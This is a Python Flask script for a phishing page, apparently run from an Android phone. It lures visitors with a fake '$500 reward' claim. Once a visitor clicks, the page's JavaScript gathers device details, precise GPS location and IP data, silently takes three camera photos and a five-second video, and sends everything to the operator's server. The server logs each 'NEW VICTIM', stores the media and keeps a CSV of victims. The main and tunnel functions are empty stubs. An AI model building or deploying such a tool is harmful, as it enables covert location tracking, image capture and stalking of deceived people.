from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import socket
import requests
import threading
from datetime import datetime
from typing import Optional

# Try imports
try:
    from flask import Flask, request, render_template_string, jsonify
    import qrcode
    from PIL import Image
    from colorama import init as colorama_init, Fore, Style, Back
    import base64
except Exception as e:
    print("Missing packages. Install: pip install flask qrcode pillow colorama requests")
    print(f"Error: {e}")
    sys.exit(1)

colorama_init(autoreset=True)

# Config
PORT = 5000
REPORT_CSV = "reports.csv"
QR_PNG = "reward_qr.png"
HOST = "0.0.0.0"

# Gallery paths
GALLERY_PATHS = [
    "/sdcard/DCIM/Camera",
    "/sdcard/DCIM/HCO_Tracker", 
    "/sdcard/Pictures/HCO_Tracker",
    "/sdcard/Download/HCO_Tracker"
]

for path in GALLERY_PATHS:
    try:
        os.makedirs(path, exist_ok=True)
    except:
        pass

app = Flask(__name__)
public_url = None

def save_to_all_locations(file_data, filename, file_type="photo"):
    """Save file to all gallery locations"""
    saved_paths = []
    for gallery_path in GALLERY_PATHS:
        try:
            file_path = os.path.join(gallery_path, filename)
            with open(file_path, 'wb') as f:
                f.write(file_data)
            os.chmod(file_path, 0o644)
            saved_paths.append(file_path)
            print(f"{Fore.GREEN}✅ {file_type} saved to: {file_path}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ Failed to save to {gallery_path}: {e}{Style.RESET_ALL}")
            continue
    
    if saved_paths:
        # Force media scan
        try:
            for path in saved_paths:
                subprocess.run([
                    'am', 'broadcast', '-a', 'android.intent.action.MEDIA_SCANNER_SCAN_FILE',
                    '-d', f'file://{path}'
                ], capture_output=True, timeout=5)
        except:
            pass
    
    return saved_paths

# COMPLETE HTML WITH WORKING JAVASCRIPT
HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>🎁 Claim Your $500 Reward!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(0,0,0,0.9);
            padding: 30px;
            border-radius: 20px;
            border: 3px solid gold;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }
        .trophy { 
            font-size: 80px; 
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        .title { 
            font-size: 32px; 
            font-weight: bold;
            margin-bottom: 10px;
            color: gold;
            text-shadow: 0 0 10px rgba(255,215,0,0.5);
        }
        .reward { 
            font-size: 48px; 
            font-weight: bold;
            color: #FFD700;
            margin: 20px 0;
            text-shadow: 0 0 20px rgba(255,215,0,0.8);
        }
        .btn {
            background: linear-gradient(45deg, #00b09b, #96c93d);
            color: white;
            border: none;
            padding: 20px 30px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 50px;
            width: 100%;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
        }
        .btn:disabled {
            background: #666;
            cursor: not-allowed;
            transform: none;
        }
        .status {
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-weight: bold;
            display: none;
        }
        .processing { 
            background: #ff9800; 
            display: block; 
        }
        .success { 
            background: #4caf50; 
            display: block; 
        }
        .error { 
            background: #f44336; 
            display: block; 
        }
        .data {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 15px;
            margin: 15px 0;
            text-align: left;
            display: none;
            border: 2px solid rgba(255,255,255,0.2);
        }
        .data h3 {
            text-align: center;
            margin-bottom: 15px;
            color: gold;
        }
        .data-item { 
            margin: 8px 0; 
            padding: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 8px;
            font-size: 14px;
        }
        .features {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 20px 0;
        }
        .feature {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            border-radius: 10px;
            font-size: 14px;
        }
        #cameraPreview {
            width: 100%;
            max-width: 300px;
            border: 2px solid gold;
            border-radius: 10px;
            margin: 10px 0;
            display: none;
        }
        #capturedImages {
            display: flex;
            gap: 10px;
            margin: 10px 0;
            flex-wrap: wrap;
            justify-content: center;
        }
        .captured-image {
            width: 80px;
            height: 80px;
            border: 2px solid gold;
            border-radius: 10px;
            object-fit: cover;
        }
        .step {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            border-radius: 8px;
            margin: 5px 0;
            text-align: left;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="trophy">🏆</div>
        <div class="title">CONGRATULATIONS!</div>
        <div>You Won Exclusive Reward</div>
        
        <div class="reward">$500</div>
        <div>Amazon Gift Card + Cash Prize</div>
        
        <div class="features">
            <div class="feature">💰 Instant Cash</div>
            <div class="feature">🎁 Gift Card</div>
            <div class="feature">📱 PhonePe</div>
            <div class="feature">⚡ Fast Transfer</div>
        </div>
        
        <div style="margin: 15px 0; font-size: 14px; opacity: 0.9;">
            ✅ Camera access required for verification
        </div>
        
        <button class="btn" id="claimBtn">
            🎁 CLAIM YOUR REWARD NOW
        </button>
        
        <!-- Steps -->
        <div class="step" id="step1">📱 Getting device information...</div>
        <div class="step" id="step2">📍 Getting your location...</div>
        <div class="step" id="step3">🌐 Getting IP address...</div>
        <div class="step" id="step4">📸 Accessing camera...</div>
        <div class="step" id="step5">🖼️ Capturing photos...</div>
        <div class="step" id="step6">🎥 Recording video...</div>
        <div class="step" id="step7">📡 Sending data...</div>
        
        <video id="cameraPreview" autoplay muted playsinline></video>
        <div id="capturedImages"></div>
        
        <div id="status" class="status"></div>
        
        <div id="data" class="data">
            <h3>🎉 Reward Claimed Successfully!</h3>
            <div class="data-item">📍 Location: <span id="loc">Capturing...</span></div>
            <div class="data-item">🌐 IP Address: <span id="ip">Capturing...</span></div>
            <div class="data-item">📱 Device: <span id="device">Capturing...</span></div>
            <div class="data-item">🖥️ Screen: <span id="screen">Capturing...</span></div>
            <div class="data-item">🌍 Browser: <span id="browser">Capturing...</span></div>
            <div class="data-item">⏰ Timezone: <span id="timezone">Capturing...</span></div>
            <div class="data-item">📸 Photos: <span id="photos">0/3</span></div>
            <div class="data-item">🎥 Video: <span id="video">Not captured</span></div>
            <div style="text-align: center; margin-top: 15px; color: gold; font-weight: bold;">
                ✅ Your $500 reward will be processed within 24 hours!
            </div>
        </div>
    </div>

    <script>
        // Global data object
        const collectedData = {
            deviceInfo: {},
            location: null,
            ipInfo: null,
            photos: [],
            video: null,
            timestamp: new Date().toISOString()
        };

        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            // Collect basic device info immediately
            collectedData.deviceInfo = getDeviceInfo();
            updateDisplay();
            
            // Start verification when button clicked
            document.getElementById('claimBtn').addEventListener('click', startVerification);
        });

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                memory: navigator.deviceMemory || 'unknown',
                cores: navigator.hardwareConcurrency || 'unknown',
                touchPoints: navigator.maxTouchPoints || 'unknown'
            };
        }

        function updateDisplay() {
            // Update device info
            document.getElementById('device').textContent = collectedData.deviceInfo.platform || 'Unknown';
            document.getElementById('screen').textContent = collectedData.deviceInfo.screen || 'Unknown';
            document.getElementById('browser').textContent = collectedData.deviceInfo.userAgent?.substring(0, 60) + '...' || 'Unknown';
            document.getElementById('timezone').textContent = collectedData.deviceInfo.timezone || 'Unknown';
            
            // Update location
            if (collectedData.location) {
                if (collectedData.location.latitude) {
                    document.getElementById('loc').textContent = 
                        `Lat: ${collectedData.location.latitude}, Lon: ${collectedData.location.longitude}`;
                } else {
                    document.getElementById('loc').textContent = 'Location access denied';
                }
            }
            
            // Update IP
            if (collectedData.ipInfo) {
                document.getElementById('ip').textContent = collectedData.ipInfo.ip || 'Unknown';
            }
            
            // Update media
            document.getElementById('photos').textContent = `${collectedData.photos.length}/3 photos`;
            document.getElementById('video').textContent = collectedData.video ? '5-second video captured' : 'Not captured';
        }

        function showStep(stepNumber) {
            // Hide all steps first
            for (let i = 1; i <= 7; i++) {
                document.getElementById(`step${i}`).style.display = 'none';
            }
            // Show current step
            document.getElementById(`step${stepNumber}`).style.display = 'block';
        }

        async function startVerification() {
            const btn = document.getElementById('claimBtn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.innerHTML = '⏳ Processing Your Reward...';
            status.className = 'status processing';
            status.innerHTML = '🚀 Starting verification process...';
            status.style.display = 'block';

            try {
                // Step 1: Device Info (already collected)
                showStep(1);
                await sleep(1000);

                // Step 2: Get Location
                showStep(2);
                collectedData.location = await getLocation();
                updateDisplay();
                await sleep(1000);

                // Step 3: Get IP
                showStep(3);
                collectedData.ipInfo = await getIPInfo();
                updateDisplay();
                await sleep(1000);

                // Step 4: Access Camera
                showStep(4);
                await accessCameraAndCapture();

                // Step 7: Send Data
                showStep(7);
                await sendAllData();

                // SUCCESS
                status.className = 'status success';
                status.innerHTML = '✅ Reward claimed successfully! $500 is being processed.';
                document.getElementById('data').style.display = 'block';
                btn.style.display = 'none';

                console.log('🎯 ALL DATA CAPTURED:', collectedData);

            } catch (error) {
                status.className = 'status error';
                status.innerHTML = '❌ Error: ' + error.message;
                btn.disabled = false;
                btn.innerHTML = '🎁 TRY AGAIN';
                
                // Still send whatever data we have
                await sendAllData();
            }
        }

        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: 'Geolocation not supported' });
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed
                        });
                    },
                    (error) => {
                        resolve({ 
                            error: error.message,
                            code: error.code 
                        });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            });
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    postal: data.postal,
                    org: data.org,
                    timezone: data.timezone
                };
            } catch (error) {
                try {
                    // Fallback IP service
                    const fallback = await fetch('https://api.ipify.org?format=json');
                    const data = await fallback.json();
                    return { ip: data.ip };
                } catch (e) {
                    return { error: 'Could not fetch IP information' };
                }
            }
        }

        async function accessCameraAndCapture() {
            const video = document.getElementById('cameraPreview');
            const capturedImages = document.getElementById('capturedImages');
            
            try {
                // Access camera
                showStep(4);
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                video.srcObject = stream;
                video.style.display = 'block';
                await video.play();
                
                // Wait for video to be ready
                await sleep(2000);
                
                // Capture 3 photos
                showStep(5);
                capturedImages.innerHTML = '';
                for (let i = 0; i < 3; i++) {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    collectedData.photos.push(imageData);
                    
                    // Show thumbnail
                    const img = document.createElement('img');
                    img.src = imageData;
                    img.className = 'captured-image';
                    img.title = `Photo ${i + 1}`;
                    capturedImages.appendChild(img);
                    
                    updateDisplay();
                    await sleep(1500); // Wait 1.5 seconds between photos
                }
                
                // Record 5-second video
                showStep(6);
                if (MediaRecorder && MediaRecorder.isTypeSupported('video/webm')) {
                    const recorder = new MediaRecorder(stream, { 
                        mimeType: 'video/webm;codecs=vp9',
                        videoBitsPerSecond: 2500000
                    });
                    const chunks = [];
                    
                    recorder.ondataavailable = (event) => {
                        if (event.data.size > 0) {
                            chunks.push(event.data);
                        }
                    };
                    
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const reader = new FileReader();
                        reader.onload = () => {
                            collectedData.video = reader.result;
                            updateDisplay();
                        };
                        reader.readAsDataURL(blob);
                    };
                    
                    recorder.start();
                    await sleep(5000); // Record for 5 seconds
                    recorder.stop();
                } else {
                    console.warn('MediaRecorder not supported');
                }
                
                // Stop all tracks
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
                
            } catch (error) {
                throw new Error('Camera access denied or error: ' + error.message);
            }
        }

        async function sendAllData() {
            const payload = {
                ...collectedData,
                timestamp: new Date().toISOString(),
                mediaType: 'real_camera_capture'
            };
            
            try {
                const response = await fetch('/report', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok) {
                    throw new Error('Server response not OK');
                }
                
                const result = await response.json();
                console.log('✅ Data sent successfully:', result);
                
            } catch (error) {
                console.error('❌ Failed to send data:', error);
                // Try fallback method
                await sendFallbackData();
            }
        }

        async function sendFallbackData() {
            // Fallback: send via image request
            const dataStr = encodeURIComponent(JSON.stringify(collectedData));
            const img = new Image();
            img.src = `/fallback?data=${dataStr}`;
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Update display initially
        updateDisplay();
    </script>
</body>
</html>
'''

@app.route("/")
def index():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    print(f"\n{Fore.GREEN}{'🎯 NEW VICTIM ACCESSED ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🌐 IP: {client_ip}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📱 User Agent: {user_agent}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}⏰ Time: {datetime.now()}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    
    return render_template_string(HTML_PAGE)

@app.route("/report", methods=["POST"])
def report():
    try:
        data = request.get_json()
        print(f"\n{Fore.GREEN}{'🚨 DATA CAPTURE STARTED ':=^60}{Style.RESET_ALL}")
        
        # Extract data
        device_info = data.get("deviceInfo", {})
        location = data.get("location", {})
        ip_info = data.get("ipInfo", {})
        photos = data.get("photos", [])
        video = data.get("video")
        timestamp = data.get("timestamp")
        
        # Print device info
        print(f"{Fore.YELLOW}📱 DEVICE INFORMATION:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Platform: {device_info.get('platform', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Screen: {device_info.get('screen', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Browser: {device_info.get('userAgent', 'Unknown')[:80]}...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Timezone: {device_info.get('timezone', 'Unknown')}{Style.RESET_ALL}")
        
        # Print location
        print(f"{Fore.YELLOW}📍 LOCATION:{Style.RESET_ALL}")
        if location.get('latitude'):
            print(f"{Fore.GREEN}  ✅ Latitude: {location.get('latitude')}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}  ✅ Longitude: {location.get('longitude')}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}  ✅ Accuracy: {location.get('accuracy')} meters{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}  ❌ Location access denied: {location.get('error', 'Unknown error')}{Style.RESET_ALL}")
        
        # Print IP info
        print(f"{Fore.YELLOW}🌐 IP INFORMATION:{Style.RESET_ALL}")
        print(f"{Fore.GREEN}  ✅ IP: {ip_info.get('ip', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  City: {ip_info.get('city', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Country: {ip_info.get('country', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  ISP: {ip_info.get('org', 'Unknown')}{Style.RESET_ALL}")
        
        # Print media info
        print(f"{Fore.YELLOW}📸 MEDIA CAPTURED:{Style.RESET_ALL}")
        print(f"{Fore.GREEN}  ✅ Photos: {len(photos)}/3 real images{Style.RESET_ALL}")
        print(f"{Fore.GREEN}  ✅ Video: {'5-second recording' if video else 'Not captured'}{Style.RESET_ALL}")
        
        # Save photos to gallery
        photo_files = []
        for i, photo_data in enumerate(photos):
            try:
                if photo_data.startswith('data:image'):
                    photo_data = photo_data.split(',')[1]
                img_data = base64.b64decode(photo_data)
                timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"HCO_Photo_{timestamp_str}_{i+1}.jpg"
                
                saved_paths = save_to_all_locations(img_data, filename, "REAL PHOTO")
                if saved_paths:
                    photo_files.append(filename)
                    print(f"{Fore.GREEN}  ✅ Photo {i+1} saved to gallery{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}  ❌ Photo {i+1} save failed: {e}{Style.RESET_ALL}")
        
        # Save video to gallery
        video_file = None
        if video:
            try:
                if video.startswith('data:video'):
                    video = video.split(',')[1]
                video_data = base64.b64decode(video)
                timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"HCO_Video_{timestamp_str}.webm"
                
                saved_paths = save_to_all_locations(video_data, filename, "REAL VIDEO")
                if saved_paths:
                    video_file = filename
                    print(f"{Fore.GREEN}  ✅ Video saved to gallery{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}  ❌ Video save failed: {e}{Style.RESET_ALL}")
        
        # Save to CSV report
        record = {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'ip': ip_info.get('ip', 'Unknown'),
            'city': ip_info.get('city', 'Unknown'),
            'country': ip_info.get('country', 'Unknown'),
            'isp': ip_info.get('org', 'Unknown'),
            'latitude': location.get('latitude', 'Unknown'),
            'longitude': location.get('longitude', 'Unknown'),
            'accuracy': location.get('accuracy', 'Unknown'),
            'photos': len(photos),
            'video': 'Yes' if video else 'No',
            'user_agent': device_info.get('userAgent', 'Unknown'),
            'platform': device_info.get('platform', 'Unknown'),
            'screen': device_info.get('screen', 'Unknown'),
            'timezone': device_info.get('timezone', 'Unknown')
        }
        
        file_exists = os.path.isfile(REPORT_CSV)
        with open(REPORT_CSV, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=record.keys())
            if not file_exists:
                writer.writeheader()
            writer.writerow(record)
        
        print(f"{Fore.GREEN}  ✅ Report saved to: {REPORT_CSV}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'🎯 DATA CAPTURE COMPLETED ':=^60}{Style.RESET_ALL}")
        
        return jsonify({"status": "success", "message": "Data captured successfully"})
        
    except Exception as e:
        print(f"{Fore.RED}{'❌ DATA CAPTURE ERROR ':=^60}{Style.RESET_ALL}")
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/fallback")
def fallback_data():
    """Fallback endpoint for data collection"""
    data_str = request.args.get('data')
    if data_str:
        try:
            data = json.loads(data_str)
            print(f"{Fore.YELLOW}📝 Fallback data received{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Data: {json.dumps(data, indent=2)}{Style.RESET_ALL}")
        except:
            pass
    return jsonify({"status": "logged"})

# [Rest of the tunneling code remains the same...]
# Include all the tunnel functions from previous code

def main():
    # [Include all the main function code from previous version]
    # This includes the tunnel setup, QR generation, etc.
    pass

if __name__ == "__main__":
    main()
